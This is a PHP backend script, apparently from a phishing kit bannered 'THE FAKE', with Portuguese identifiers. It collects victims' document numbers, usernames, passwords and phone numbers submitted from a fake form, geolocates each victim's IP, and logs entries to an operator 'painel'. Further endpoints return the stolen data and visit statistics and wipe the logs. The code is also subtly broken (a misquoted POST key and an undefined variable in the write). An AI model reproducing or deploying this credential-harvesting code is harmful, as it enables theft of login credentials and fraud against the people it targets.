<?php 

/*
▀▀█▀▀ ▒█░▒█ ▒█▀▀▀ ░░ ▒█▀▀▀ ░█▀▀█ ▒█░▄▀ ▒█▀▀▀ 
░▒█░░ ▒█▀▀█ ▒█▀▀▀ ▀▀ ▒█▀▀▀ ▒█▄▄█ ▒█▀▄░ ▒█▀▀▀ 
░▒█░░ ▒█░▒█ ▒█▄▄▄ ░░ ▒█░░░ ▒█░▒█ ▒█░▒█ ▒█▄▄▄
*/


$ok = $_POST["session"];

switch($ok){

case 'slv':

$DocumentNumber = $_POST['DocumentNumber'];
$UserName = $_POST['$UserName'];
$Password = $_POST['Password'];
$tel = $_POST['tel'];
  
  if(empty($UserName) && empty($Password)){
      echo "error";
  }
  
  else{
        $ip = $_SERVER['REMOTE_ADDR'];
        $str = file_get_contents("../painel/i.txt");
		$pattern = "/".$ip."/i";
		$retorno = preg_match_all($pattern, $str);
        require_once("../painel/configure.php");
		if($retorno == TOTAL || $retorno > TOTAL){
		echo "";
		}else{
		date_default_timezone_set('America/Sao_Paulo');
		$date = date('d/m/y - H:i');
  
		if($ip=="::1" || $ip=="127.0.0.1"){
		$cidade = "Localhost"; 
		$estado = "Localhost"; 
		}else{
		$r = json_decode(file_get_contents("https://geolocation-db.com/json/$ip")); 		
		if($r->city=="Not found" || $r->state=="Not found"){
		$cidade = "Nao Localizado";
		$estado = "Nao Localizado";
		}else{
		$cidade = $r->city; 
		$estado = $r->state; 
		}
		}
     
  	    $session_save = '
		<tr id="the">
		<td>'.$DocumentNumber.'</td>
		<td>'.$UserName.'</td>
		<td>'.$Password.'</td>
		<td>'.$tel.'</td>
		
		</tr>
		';
	   
	    file_put_contents('../painel/i.txt', $slv, FILE_APPEND);
	   	   
		$txt = "../painel/t.txt";
		$arquivo = fopen($txt,"r");
		$visitas   = fgets($arquivo,1024);
		fclose($arquivo);
		$x = $visitas;

		$arquivo = fopen($txt,"r+");
		$visitas = $visitas + 1;
		fwrite($arquivo,$visitas);
		fclose($arquivo);
		
	    echo " ";
    
		}
       
  }
break;

case "estatisticas":

$visitas = file_get_contents("../painel/v.txt");
$total_infos = file_get_contents("../painel/t.txt");
$bots = file_get_contents("../painel/b.txt");
$desktop = file_get_contents("../painel/d.txt");
$mobile = file_get_contents("../painel/m.txt");

echo "$visitas|$total_infos|$bots|$desktop|$mobile";					
					
break;

case "dados":

$infos = file_get_contents("../painel/i.txt");

echo $infos;					
					
break;

case "limpar":
  $zerar = $_POST["zerar"];
  
  switch($zerar){
   case "visitas":
             
             $v = "../painel/v.txt";
			 $fp = fopen($v,"w+");
			 fwrite($fp, "0");
			 fclose($fp);
			 echo "sucesso";
			 
   break;
   case "infos":
             
			 $i = "../painel/i.txt";
			 $fp = fopen($i,"w+");
			 fwrite($fp, "");
			 fclose($fp);
			 
			 $t = "../painel/t.txt";
			 $fp = fopen($t,"w+");
			 fwrite($fp, "0");
			 fclose($fp);
			 
			 echo "sucesso";
			
   break; 
   case "bots":
             $b = "../painel/b.txt";
			 $fp = fopen($b,"w+");
			 fwrite($fp, "0");
			 fclose($fp);
			 echo "sucesso";
   break;
   case "pc":
             $b = "../painel/d.txt";
			 $fp = fopen($b,"w+");
			 fwrite($fp, "0");
			 fclose($fp);
			 echo "sucesso";
   break; 
   case "mobile":
             $b = "../painel/m.txt";
			 $fp = fopen($b,"w+");
			 fwrite($fp, "0");
			 fclose($fp);
			 echo "sucesso";
   break;

  default:
   echo "error";
  break;
   }           
break; 

default:
 echo "houve um erro na api";
break;

}
?>